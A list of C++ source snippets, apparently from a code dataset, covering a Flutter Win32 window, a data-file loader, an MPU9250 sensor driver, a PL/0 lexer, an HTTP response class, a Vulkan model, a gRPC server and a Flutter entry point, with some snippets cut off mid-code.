window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"Observations.hpp\"\n#include <iostream>\n#include <fstream>\n#include <vector>\n#include <string>\n#include <sstream>\n#include <assert.h>\n\ntemplate<typename REAL>\nvoid Observations<REAL>::loadData(const std::string& filename, const bool rigidity)\n{\n    // check extension of file.\n    std::string last_four_characters = filename.substr(filename.length() - 4);\n    if (last_four_characters != \".txt\"){\n        std::string error_message = \"Incorrect file extension: \" + last_four_characters + \" instead of .txt for file \" + filename +  \" .\";\n        throw std::invalid_argument(error_message);\n    }\n    \n    //ifstream means input file stream\n    std::ifstream filestream(filename);\n    if (!filestream.is_open()) {\n        std::string error_message = \"Unable to open file: \" + filename;\n        throw std::runtime_error(error_message);\n    }\n    std::string line;\n    uint row_num = 0;\n\n    while(std::getline(filestream, line))\n    {\n        // A string stream can be used for parsing strings with multiple pieces of data in it\n        // String steam is separated into three sections for x, y and sigma. First we check only 3 sections exist.\n        \n        std::istringstream line_stream(line);\n        std::string token;\n        row_num++;\n\n        REAL buffer;\n        if (!(line_stream >> buffer)){\n            if (rigidity){\n                filestream.close();\n                throw std::invalid_argument(\"Error - Invalid data read from line \" + std::to_string(row_num) + \" : \" + line);\n            }\n            else{\n                std::cerr << \"Skipping row - Error reading input data from line \" << row_num << \" : \" << line << std::endl;\n                continue;\n            }\n        } \n        inputs.push_back(buffer);\n        \n        if (!(line_stream >> buffer)){\n            if (rigidity){\n                filestream.close();\n                throw std::invalid_argument(\"Error - Invalid data read from line \" + std::to_string(row_num) + \" : \" + line);\n            }\n            else{\n                std::cerr << \"Skipping row - Error reading output data from line \" << row_num << \" : \" << line << std::endl;\n                inputs.pop_back();\n                continue;\n            }\n        }\n        outputs.push_back(buffer);\n        \n        if (!(line_stream >> buffer)){\n            if (rigidity) {\n                filestream.close();\n                throw std::invalid_argument(\"Error - Invalid data read from line \" + std::to_string(row_num) + \" : \" + line);\n            }\n            else{\n                std::cerr << \"Skipping row - Error reading sigma data from line \" << row_num << \" : \" << line << std::endl;\n                inputs.pop_back();\n                outputs.pop_back();\n                continue;\n            }\n        }\n        if (buffer < 0){\n            if (rigidity){\n                filestream.close();\n                throw std::domain_error(\"Error - Sigma value possess invalid negative value in line \"+ std::to_string(row_num) + \" : \" + line);\n            }\n            else{\n                std::cerr << \"Skipping row - Sigma value is negative where standard deviation is inherently positive in line \" << row_num << \" : \" << line << std::endl;\n                inputs.pop_back();\n                outputs.pop_back();\n                continue;\n            }\n        }\n        sigmas.push_back(buffer);\n        \n        if (line_stream >> token){\n            if (rigidity){\n                filestream.close();\n                throw std::domain_error(\"Error - Unexpected data exceeding three features x, y and sigma format in line \" + std::to_string(row_num) + \" : \" + line);\n            }\n            std::cerr << \"Unexpected data exceeding three feature x, y and sigma format in line \" << row_num << \" :  \" << line << std::endl;\n        }\n    }\n    filestream.close();\n    num_points = sigmas.size();\n}\n\ntemplate void Observations<double>::loadData(const std::string&, const bool);\ntemplate void Observations<float>::loadData(const std::string&, const bool);",
    "/*\nMPU9250.cpp\nShiven Patel\nshivenpatel399@gmail.com\n\nCopyright (c) 2024 Shiven Patel\n\nPermission is hereby granted, free of charge, to any person obtaining a copy of this software \nand associated documentation files (the \"Software\"), to deal in the Software without restriction, \nincluding without limitation the rights to use, copy, modify, merge, publish, distribute, \nsublicense, and/or sell copies of the Software, and to permit persons to whom the Software is \nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all copies or \nsubstantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING \nBUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND \nNONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, \nDAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, \nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.\n*/\n\n#include \"Arduino.h\"\n#include \"MPU9250.h\"\n\n/* MPU9250 object, input the I2C bus and address */\nMPU9250::MPU9250(TwoWire &bus,uint8_t address){\n  _i2c = &bus; // I2C bus\n  _address = address; // I2C address\n  _useSPI = false; // set to use I2C\n}\n\n/* MPU9250 object, input the SPI bus and chip select pin */\nMPU9250::MPU9250(SPIClass &bus,uint8_t csPin){\n  _spi = &bus; // SPI bus\n  _csPin = csPin; // chip select pin\n  _useSPI = true; // set to use SPI\n}\n\n/* starts communication with the MPU-9250 */\nint MPU9250::begin(){\n  if( _useSPI ) { // using SPI for communication\n    // use low speed SPI for register setting\n    _useSPIHS = false;\n    // setting CS pin to output\n    pinMode(_csPin,OUTPUT);\n    // setting CS pin high\n    digitalWrite(_csPin,HIGH);\n    // begin SPI communication\n    _spi->begin();\n  } else { // using I2C for communication\n    // starting the I2C bus\n    _i2c->begin();\n    // setting the I2C clock\n    _i2c->setClock(_i2cRate);\n  }\n  // select clock source to gyro\n  if(writeRegister(PWR_MGMNT_1,CLOCK_SEL_PLL) < 0){\n    return -1;\n  }\n  // enable I2C master mode\n  if(writeRegister(USER_CTRL,I2C_MST_EN) < 0){\n    return -2;\n  }\n  // set the I2C bus speed to 400 kHz\n  if(writeRegister(I2C_MST_CTRL,I2C_MST_CLK) < 0){\n    return -3;\n  }\n  // set AK8963 to Power Down\n  writeAK8963Register(AK8963_CNTL1,AK8963_PWR_DOWN);\n  // reset the MPU9250\n  writeRegister(PWR_MGMNT_1,PWR_RESET);\n  // wait for MPU-9250 to come back up\n  delay(1);\n  // reset the AK8963\n  writeAK8963Register(AK8963_CNTL2,AK8963_RESET);\n  // select clock source to gyro\n  if(writeRegister(PWR_MGMNT_1,CLOCK_SEL_PLL) < 0){\n    return -4;\n  }\n  // check the WHO AM I byte, expected value is 0x71 (decimal 113) or 0x73 (decimal 115)\n  if((whoAmI() != 113)&&(whoAmI() != 115)){\n    return -5;\n  }\n  // enable accelerometer and gyro\n  if(writeRegister(PWR_MGMNT_2,SEN_ENABLE) < 0){\n    return -6;\n  }\n  // setting accel range to 16G as default\n  if(writeRegister(ACCEL_CONFIG,ACCEL_FS_SEL_16G) < 0){\n    return -7;\n  }\n  _accelScale = G * 16.0f/32767.5f; // setting the accel scale to 16G\n  _accelRange = ACCEL_RANGE_16G;\n  // setting the gyro range to 2000DPS as default\n  if(writeRegister(GYRO_CONFIG,GYRO_FS_SEL_2000DPS) < 0){\n    return -8;\n  }\n  _gyroScale = 2000.0f/32767.5f * _d2r; // setting the gyro scale to 2000DPS\n  _gyroRange = GYRO_RANGE_2000DPS;\n  // setting bandwidth to 184Hz as default\n  if(writeRegister(ACCEL_CONFIG2,ACCEL_DLPF_184) < 0){ \n    return -9;\n  } \n  if(writeRegister(CONFIG,GYRO_DLPF_184) < 0){ // setting gyro bandwidth to 184Hz\n    return -10;\n  }\n  _bandwidth = DLPF_BANDWIDTH_184HZ;\n  // setting the sample rate divider to 0 as default\n  if(writeRegister(SMPDIV,0x00) < 0){ \n    return -11;\n  } \n  _srd = 0;\n  // enable I2C master mode\n  if(writeRegister(USER_CTRL,I2C_MST_EN) < 0){\n  \treturn -12;\n  }\n\t// set the I2C bus speed to 400 kHz\n\tif( writeRegister(I2C_MST_CTRL,I2C_MST_CLK) < 0){\n\t\treturn -13;\n\t}\n\t// check AK8963 WHO AM I register, expected value is 0x48 (decimal 72)\n\tif( whoAmIAK8963() != 72 ){\n    return -14;\n\t}\n  /* get the magnetometer calibration */\n  // set AK8963 to Power Down\n  if(writeAK8963Register(AK8963_CNTL1,AK8963_PWR_DOWN) < 0){\n    return -15;\n  }\n  delay(100); // long wait between AK8963 mode changes\n  // set AK8963 to FUSE ROM access\n  if(writeAK8963Register(AK8963_CNTL1,AK8963_FUSE_ROM) < 0){\n    return -16;\n  }\n  delay(100); // long wait between AK8963 mode changes\n  // read the AK8963 ASA registers and compute magnetometer scale factors\n  readAK8963Registers(AK8963_ASA,3,_buffer);\n  _magScaleX = ((((float)_buffer[0]) - 128.0f)/(256.0f) + 1.0f) * 4912.0f / 32760.0f; // micro Tesla\n  _magScaleY = ((((float)_buffer[1]) - 128.0f)/(256.0f) + 1.0f) * 4912.0f / 32760.0f; // micro Tesla\n  _magScaleZ = ((((float)_buffer[2]) - 128.0f)/(256.0f) + 1.0f) * 4912.0f / 32760.0f; // micro Tesla \n  // set AK8963 to P",
    "#include \"Lexer.hpp\"\n\nnamespace PL0 \n{\n\tLexer::Lexer(const std::string& filename)\n\t\t: m_line(1), m_column(0)\n\t{\n\t\tstd::ifstream code(filename);\n\n\t\tif (!code.is_open())\n\t\t\tthrow OpenFileFailed(filename);\n\t\tstd::stringstream buffer;\n\t\tbuffer << code.rdbuf();\n\t\tm_file = buffer.str();\n\n\t\tstd::transform(m_file.begin(), m_file.end(), m_file.begin(), [](unsigned char c) { return std::tolower(c); });\n\n\t\tm_currentChar = getChar(m_line, m_column);\n\t}\n\n\tLexer::~Lexer() {}\n\n\tbool Lexer::isKeyWords(std::string str) \n\t{\n\t\treturn PL0::KeyWords.find(str)!= PL0::KeyWords.end();\n\t}\n\n\tbool Lexer::isOperatorWords(std::string str)\n\t{\n\t\treturn PL0::OperatorWords.find(str) != PL0::OperatorWords.end();\n\t}\n\n\tbool Lexer::isDelimiterWords(std::string str)\n\t{\n\t\treturn PL0::DelimiterWords.find(str) != PL0::DelimiterWords.end();\n\t}\n\n\tbool Lexer::isIdentifier(std::string str)\n\t{\n\t\tif ( (str.empty()) || (!isalpha(str[0])) )\n\t\t\treturn false;\n\n\t\tfor (int i = 1; i < str.size(); i++)\n\t\t\tif (!(isalpha(str[i])) && !(isdigit(str[i])))\n\t\t\t\treturn false;\n\n\t\treturn true;\n\t}\n\n\tchar Lexer::getChar(size_t line, size_t column)\n\t{\n\t\tsize_t pos = 0;\n\n\t\tfor (size_t i = 0; i < line - 1; i++)\n\t\t{\n\t\t\tpos = m_file.find('\\n', pos);\n\t\t\tpos++;\n\t\t}\n\n\t\tpos += column;\n\n\t\treturn m_file[pos];\n\t}\n\n\tvoid Lexer::nextChar()\n\t{\n\t\tm_column++;\n\t\tif (m_currentChar == '\\n')\n\t\t{\n\t\t\tm_line++;\n\t\t\tm_column = 0;\n\t\t}\n\n\t\tm_currentChar = getChar(m_line, m_column);\n\t}\n\n\tchar Lexer::getNextChar(size_t line, size_t column)\n\t{\n\t\treturn getChar(line, column+1);\n\t}\n\n\n\tToken Lexer::nextToken()\n\t{\n\t\tskipSpace();\n\t\tskipComment();\n\t\tskipSpace();\n\n\t\tif (isdigit(m_currentChar))\n\t\t\treturn parseNumber();\n\t\telse if (isDelimiterWords(std::string(1, m_currentChar)))\n\t\t\treturn parseDelimiter();\n\t\telse if (isOperatorWords(std::string(1, m_currentChar))||m_currentChar==':')\n\t\t\treturn parseOperator();\n\t\telse if (isalpha(m_currentChar))\n\t\t\treturn parseKeyWordOrIdentifier();\n\t\telse if (m_currentChar=='\\0')\n\t\t\treturn parseEOF();\n\t\telse return parseUnknownSymbol();\n\t}\n\n\tvoid Lexer::skipComment()\n\t{\n\t\tif (m_currentChar == '{')\n\t\t{\n\t\t\twhile (m_currentChar != '}' && m_currentChar != '\\0')\n\t\t\t\tnextChar();\n\t\t\tif (m_currentChar == '\\0')\n\t\t\t\treturn;\n\t\t\tnextChar();\n\t\t}\n\t}\n\n\tvoid Lexer::skipSpace()\n\t{\n\t\twhile (m_currentChar == ' '||m_currentChar == '\\n'||m_currentChar == '\\t'||m_currentChar == '\\r')\n\t\t{\n\t\t\tnextChar();\n\t\t}\n\t}\n\n\tToken Lexer::parseNumber()\n\t{\n\t\tstd::string word;\n\t\twhile (isdigit(m_currentChar))\n\t\t{\n\t\t\tword += m_currentChar;\n\t\t\tnextChar();\n\t\t}\n\t\n\t\tif (isalpha(m_currentChar))\n\t\t{\n\t\t\twhile (isdigit(m_currentChar) || isalpha(m_currentChar))\n\t\t\t{\n\t\t\t\tword += m_currentChar;\n\t\t\t\tnextChar();\n\t\t\t}\n\t\t\tstd::cout << std::format(\"Error: Line {0}, {1} is not a valid identifier\\n\",m_line,word);\n\t\t\treturn { TokenType::NONE, word };  \n\t\t}\n\t\t\t\n\t\treturn { TokenType::NUMBER, word };\n\t}\n\n\tToken Lexer::parseDelimiter()\n\t{\n\t\tstd::string delimiter = std::string(1, m_currentChar);\n\t\tnextChar();\n\t\treturn { TokenType::DELIMITER, delimiter };\n\t}\n\n\tToken Lexer::parseOperator()\n\t{\n\t\tstd::string op,op2;\n\t\top = m_currentChar; \n\t\tnextChar();\n\t\top2 = op + m_currentChar;\n\t\tif (isOperatorWords(op2))\n\t\t{\n\t\t\tnextChar();\n\t\t\treturn { TokenType::OPERATOR, op2 };\n\t\t}\n\t\telse if (isOperatorWords(op))\n\t\t{\n\t\t\treturn { TokenType::OPERATOR, op };\n\t\t}\n\t\telse  {\t\t\t\n\t\t\tstd::cout<<std::format(\"Error: Line {0}, {1} is not a valid operator\\n\",m_line,op);\n\t\t\treturn { TokenType::NONE, op};\n\t\t}\n\t}\n\n\tToken Lexer::parseKeyWordOrIdentifier()\n\t{\n\t\tstd::string word;\n\t\twhile (isalpha(m_currentChar))\n\t\t{\n\t\t\tword += m_currentChar;\n\t\t\tnextChar();\n\t\t}\n\t\tif (isKeyWords(word))\n\t\t\treturn { TokenType::KEYWORD, word };\n\n\t\twhile (isalpha(m_currentChar) || isdigit(m_currentChar))\n\t\t{\n\t\t\tword += m_currentChar;\n\t\t\tnextChar();\n\t\t}\n\t\treturn { TokenType::IDENTIFIER, word };\n\t}\n\n\tToken Lexer::parseUnknownSymbol() \n\t{\n\t\tstd::string unknown;\n\t\tif (!isDelimiterWords(std::string(1, m_currentChar)) && !isalpha(m_currentChar) && !isdigit(m_currentChar))\n\t\t{\n\t\t\tunknown += m_currentChar;\n\t\t\tnextChar();\n\t\t}\n\t\tstd::cout << std::format(\"Error: Line {0}, {1} is an unknown symbol\\n\",m_line,unknown);\n\t\treturn { TokenType::NONE, unknown };\n\t}\n\n\tToken Lexer::parseEOF()\n\t{\n\t\treturn { TokenType::ENDOFFILE, \"end of file\" };\n\t}\n}\n",
    "/* ************************************************************************** */\n/*                                                                            */\n/*                                                        :::      ::::::::   */\n/*   HTTPResponse.cpp                                   :+:      :+:    :+:   */\n/*                                                    +:+ +:+         +:+     */\n/*   By: migarci2 <migarci2@student.42malaga.com    +#+  +:+       +#+        */\n/*                                                +#+#+#+#+#+   +#+           */\n/*   Created: 2024/04/06 16:15:46 by migarci2          #+#    #+#             */\n/*   Updated: 2024/04/15 16:07:55 by migarci2         ###   ########.fr       */\n/*                                                                            */\n/* ************************************************************************** */\n\n#include \"HTTPResponse.hpp\"\n\nHTTPResponse::HTTPResponse()\n    : httpVersion(\"1.1\"), statusCode(0), statusMessage(\"\"), body(\"\") {}\n\nHTTPResponse::HTTPResponse(const HTTPResponse &other)\n    : httpVersion(other.httpVersion), statusCode(other.statusCode), \n    statusMessage(other.statusMessage), body(other.body), headers(other.headers) {}\n\n\nHTTPResponse::~HTTPResponse() {}\n\nHTTPResponse &HTTPResponse::operator=(const HTTPResponse &other)\n{\n    if (this != &other)\n    {\n        statusCode = other.statusCode;\n        statusMessage = other.statusMessage;\n        httpVersion = other.httpVersion;\n        body = other.body;\n        headers = other.headers;\n    }\n    return *this;\n}\n\nint HTTPResponse::getStatusCode() const\n{\n    return statusCode;\n}\n\nstd::string HTTPResponse::getStatusMessage() const\n{\n    return statusMessage;\n}\n\nstd::string HTTPResponse::getHttpVersion() const\n{\n    return httpVersion;\n}\n\nstd::string HTTPResponse::getBody() const\n{\n    return body;\n}\n\nstd::map<std::string, std::string> HTTPResponse::getHeaders() const\n{\n    return headers;\n}\n\nvoid HTTPResponse::setHttpVersion(const std::string &version)\n{\n    httpVersion = version;\n}\n\nvoid HTTPResponse::setStatusCode(int code)\n{\n    statusCode = code;\n}\n\nvoid HTTPResponse::setStatusMessage(const std::string &message)\n{\n    statusMessage = message;\n}\n\nvoid HTTPResponse::setBody(const std::string &b)\n{\n    body = b;\n}\n\nvoid HTTPResponse::addHeader(const std::string &key, const std::string &value)\n{\n    headers[key] = value;\n}\n\nstd::string HTTPResponse::getHeader(const std::string &key) const\n{\n    std::map<std::string, std::string>::const_iterator it = headers.find(key);\n    return it != headers.end() ? it->second : \"\";\n}\n\nvoid HTTPResponse::clear()\n{\n    statusCode = 0;\n    statusMessage = \"NULL\";\n    httpVersion = \"1.1\";\n    body.clear();\n    headers.clear();\n}\n",
    "#include \"vkm_model.h\"\n\n#include <cassert>\n#include <cstring>\n\nnamespace vkm {\n\n\tVkmModel::VkmModel(VkmDevice &device, const std::vector<Vertex> &vertices) : vkmDevice{ device } {\n\t\tcreateVertexBuffers(vertices);\n\t}\n\tVkmModel::~VkmModel() {\n\t\tvkDestroyBuffer(vkmDevice.device(), vertexBuffer, nullptr);\n\t\tvkFreeMemory(vkmDevice.device(), vertexBufferMemory, nullptr);\n\t}\n\n\tvoid VkmModel::createVertexBuffers(const std::vector<Vertex> &vertices) {\n\t\tvertexCount = static_cast<uint32_t>(vertices.size());\n\t\tassert(vertexCount >= 3 && \"Vertex count must be at least 3\");\n\t\tVkDeviceSize bufferSize = sizeof(vertices[0]) * vertexCount;\n\t\tvkmDevice.createBuffer(\n\t\t\tbufferSize,\n\t\t\tVK_BUFFER_USAGE_VERTEX_BUFFER_BIT,\n\t\t\tVK_MEMORY_PROPERTY_HOST_VISIBLE_BIT | VK_MEMORY_PROPERTY_HOST_COHERENT_BIT,\n\t\t\tvertexBuffer,\n\t\t\tvertexBufferMemory);\n\n\t\tvoid *data;\n\t\tvkMapMemory(vkmDevice.device(), vertexBufferMemory, 0, bufferSize, 0, &data);\n\t\tmemcpy(data, vertices.data(), static_cast<size_t>(bufferSize));\n\t\tvkUnmapMemory(vkmDevice.device(), vertexBufferMemory);\n\t}\n\n\tvoid VkmModel::draw(VkCommandBuffer commandBuffer) {\n\t\tvkCmdDraw(commandBuffer, vertexCount, 1, 0, 0);\n\t}\n\n\tvoid VkmModel::bind(VkCommandBuffer commandBuffer) {\n\t\tVkBuffer buffers[] = { vertexBuffer };\n\t\tVkDeviceSize offsets[] = { 0 };\n\t\tvkCmdBindVertexBuffers(commandBuffer, 0, 1, buffers, offsets);\n\t}\n\n\tstd::vector<VkVertexInputBindingDescription> VkmModel::Vertex::getBindingDescriptions() {\n\t\tstd::vector<VkVertexInputBindingDescription> bindingDescriptions(1);\n\t\tbindingDescriptions[0].binding = 0;\n\t\tbindingDescriptions[0].stride = sizeof(Vertex);\n\t\tbindingDescriptions[0].inputRate = VK_VERTEX_INPUT_RATE_VERTEX;\n\t\treturn bindingDescriptions;\n\t}\n\n\tstd::vector<VkVertexInputAttributeDescription> VkmModel::Vertex::getAttributeDescriptions() {\n\t\tstd::vector<VkVertexInputAttributeDescription> attributeDescriptions(2);\n\n\t\tattributeDescriptions[0].binding = 0;\n\t\tattributeDescriptions[0].location = 0;\n\t\tattributeDescriptions[0].format = VK_FORMAT_R32G32_SFLOAT;\n\t\tattributeDescriptions[0].offset = offsetof(Vertex, position);;\n\n\t\tattributeDescriptions[1].binding = 0;\n\t\tattributeDescriptions[1].location = 1;\n\t\tattributeDescriptions[1].format = VK_FORMAT_R32G32B32_SFLOAT;\n\t\tattributeDescriptions[1].offset = offsetof(Vertex, color);;\n\t\treturn attributeDescriptions;\n\t}\n}",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <iostream>\n#include <memory>\n#include <string>\n#include <time.h>\n\n#include \"media_rtc_server.h\"\n\nusing grpc::Server;\nusing grpc::ServerBuilder;\nusing grpc::ServerContext;\nusing grpc::Status;\n\nint main(int argc, char** argv)\n{\n    std::string server_address(\"0.0.0.0:30002\");\n\n    MediaRTCServiceImpl service;\n\n    grpc::EnableDefaultHealthCheckService(true);\n    grpc::reflection::InitProtoReflectionServerBuilderPlugin();\n    ServerBuilder builder;\n    // Listen on the given address without any authentication mechanism.\n    builder.AddListeningPort(server_address, grpc::InsecureServerCredentials());\n\n    builder.AddChannelArgument(GRPC_ARG_KEEPALIVE_TIME_MS, 1000 * 10);\n    builder.AddChannelArgument(GRPC_ARG_KEEPALIVE_TIMEOUT_MS, 1000 * 25);\n    builder.AddChannelArgument(GRPC_ARG_KEEPALIVE_PERMIT_WITHOUT_CALLS, 1);\n\n    // Register \"service\" as the instance through which we'll communicate with\n    // clients. In this case it corresponds to an *synchronous* service.\n    builder.RegisterService(&service);\n\n\n    // Finally assemble the server.\n    std::unique_ptr<Server> server(builder.BuildAndStart());\n    std::cout << \"Server listening on \" << server_address << std::endl;\n\n    // Wait for the server to shutdown. Note that some other thread must be\n    // responsible for shutting down the server for this call to ever return.\n    // the Wait() is blocked.\n    server->Wait();\n\n    std::cout << \"Now start to shutdown the server\" << std::endl;\n    server->Shutdown();\n    \n    return 0;\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"yasam_uyg\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
